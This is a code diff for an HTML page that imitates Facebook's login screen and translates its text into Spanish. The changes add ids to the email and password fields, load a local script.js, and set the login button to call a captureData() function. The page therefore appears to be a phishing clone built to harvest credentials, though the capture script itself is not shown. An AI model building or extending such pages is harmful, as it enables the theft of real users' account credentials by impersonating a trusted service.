@@ -10,7 +10,10 @@
     <title>Facebook</title>
     <link rel="preconnect" href="https://fonts.gstatic.com">
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="icon" href="images/logoicono.png">
     <link rel="stylesheet" href="styles.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <script src="script.js"></script>
 </head>
 
 <body>
@@ -18,17 +21,17 @@
         <div class="row">
             <div class="col-logo">
                 <img src="/CSS/Copiar NFT's/image/fb_logo.svg" alt="Logo">
-                <h2>Facebook helps you connect and share with the people in your life.</h2>
+                <h2>Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</h2>
             </div>
             <div class="col-form">
                 <div class="form-container">
-                    <input type="text" placeholder="Email address or phone number">
-                    <input type="password" placeholder="Password">
-                    <button class="btn-login">Login</button>
-                    <a href="#">Forgotten password?</a>
+                    <input type="text" placeholder="Email address or phone number" id="email">
+                    <input type="password" placeholder="Password" id="pw">
+                    <button type="button" class="btn-login"onclick="captureData()">Iniciar Sesion</button>
+                    <a href="#">¿Has olvidado tu contraseña?</a>
                     <button class="btn-new">Create new Account</button>
                 </div>
-                <p><a href="#"><b>Create a Page</b></a> for a celebrity, brand or business.</p>
+                <p><a href="#"><b>Crea una página</b></a> para un famoso, una marca o una empresa</p>
             </div>
         </div>
     </main>
@@ -46,7 +49,7 @@
                 <li><a href="#">Español</a></li>
                 <li><a href="#">Português (Brasil)</a></li>
                 <li><a href="#">Français (France)</a></li>
-                <li><button>+</button></li>
+                <li><button class="max">+</button></li>
             </ol>
 
             <ol>
